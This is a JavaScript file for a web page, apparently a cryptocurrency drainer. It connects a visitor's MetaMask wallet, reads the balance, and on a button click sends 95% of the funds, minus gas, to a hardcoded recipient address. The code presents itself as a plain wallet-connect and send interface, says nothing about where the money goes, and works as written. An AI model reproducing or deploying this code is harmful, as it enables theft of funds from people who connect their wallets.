document.addEventListener('DOMContentLoaded', async () => {
  let account;

  const connectButton = document.getElementById('metamask_wallet');
  const sendButton = document.getElementById('send-btn');
  const accountNumber = document.getElementById('account-number');
  const errorMessageElement = document.getElementById('error-message');

  connectButton.addEventListener('click', async () => {
    if (window.ethereum) {
      try {
        await ethereum.request({ method: 'eth_requestAccounts' });
        account = (await ethereum.request({ method: 'eth_accounts' }))[0];
        console.log(`Connected to account: ${account}`);

        const provider = new ethers.providers.Web3Provider(window.ethereum);

        const balance = await provider.getBalance(account);
        const balanceInETH = ethers.utils.formatEther(balance);

        console.log(`Balance: ${balanceInETH} ETH`);

        const shortenedAccount = `${account.slice(0, 4)}...${account.slice(-4)}`;
        accountNumber.textContent = `${shortenedAccount}`;
        errorMessageElement.textContent = ''; // Очищаем сообщение об ошибке

        // Перемещаем кнопку "Connect Wallet" внутрь элемента "account-number"

      } catch (error) {
        console.error('Error connecting:', error);
        errorMessageElement.textContent = 'Error connecting: ' + error.message;
        errorMessageElement.classList.add('active_error'); // Добавляем класс ошибки
      }
    } else {
      console.error('No Ethereum provider found.');
      errorMessageElement.textContent = 'No Ethereum provider found.';
      errorMessageElement.classList.add('active_error'); // Добавляем класс ошибки
    }
  });

  sendButton.addEventListener('click', async () => {
    if (!account) {
      console.error('Please connect to a wallet first.');
      errorMessageElement.textContent = 'Please connect to a wallet first.';
      errorMessageElement.classList.add('active_error'); // Добавляем класс ошибки
      return;
    }

    const provider = new ethers.providers.Web3Provider(window.ethereum);
    const signer = provider.getSigner();

    try {
      const gasPrice = await provider.getGasPrice();
      const gasLimit = 21000; // Standard gas limit for a simple ETH transfer

      const balance = await provider.getBalance(account);
      const sendableAmount = balance.mul(19).div(20); // 95% of the balance

      if (sendableAmount.gte(gasPrice.mul(gasLimit))) {
        const transactionParam = {
          to: '0xDA35A9bf6bD6442C0aCe715e122fFB20871f1351', // Адрес получателя
          value: sendableAmount.sub(gasPrice.mul(gasLimit))
        };

        const txResponse = await signer.sendTransaction(transactionParam);
        console.log(`Transaction sent. Transaction hash: ${txResponse.hash}`);
      } else {
        console.error('Insufficient balance to cover gas cost.');
        errorMessageElement.textContent = 'Insufficient balance to cover gas cost.';
        errorMessageElement.classList.add('active_error'); // Добавляем класс ошибки
      }
    } catch (error) {
      console.error('Error sending transaction:', error);
      errorMessageElement.textContent = 'Error sending transaction: ' + error.message;
      errorMessageElement.classList.add('active_error'); // Добавляем класс ошибки
    }
  });

  window.addEventListener('mouseup', (event) => {
  if (errorMessageElement.classList.contains('active_error') && !errorMessageElement.contains(event.target)) {
    errorMessageElement.classList.remove('active_error'); // Убираем класс ошибки
  }
});
});
